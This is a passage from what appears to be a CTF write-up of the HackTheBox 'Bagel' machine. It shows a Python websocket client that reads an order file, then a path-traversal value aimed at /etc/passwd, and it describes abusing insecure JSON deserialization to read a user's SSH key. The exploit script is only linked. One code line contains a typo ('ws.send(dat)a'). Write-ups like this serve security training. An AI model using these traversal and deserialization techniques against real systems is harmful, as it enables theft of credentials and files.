        ws = websocket.WebSocket()    
        ws.connect("ws://127.0.0.1:5000/") # connect to order app
        order = {"ReadOrder":"orders.txt"}
        data = str(json.dumps(order))
        ws.send(dat)a
        result = ws.recv()
        return(json.loads(result)['ReadOrder'])
    except:
        return("Unable to connect")
```

Running it does whats expected ( gives the content of orders.txt )

```
└─$ python3 wsconnect.py
order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]
order #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]
order #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels] 
```

I tried putting like various sort of bypass in order to read like local files but it didn't work cause of the filter in place:

```
order = {"ReadOrder":"././/././/././/././/././/etc//passwd"}
```

Now if you remember the handler function code it serialize the value from the ws socket data

So if we pass in a serialized object it will deserialize and evaluate it therefore this is an insecure deserialization vulnerability

With this i searched for json deserialzation attack and used chatgpt to make the payload 🤓

Using the deserialization vulnerability i can leverage it to read the user's ssh key cause the value will be converted to a serialzied object which will bypass the lfi filter in place 

Here's the exploit script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/htb/b2b/bagel/deserialize.py)

So what the exploit script does is that it abuses the ReadFile function class of the ws socket
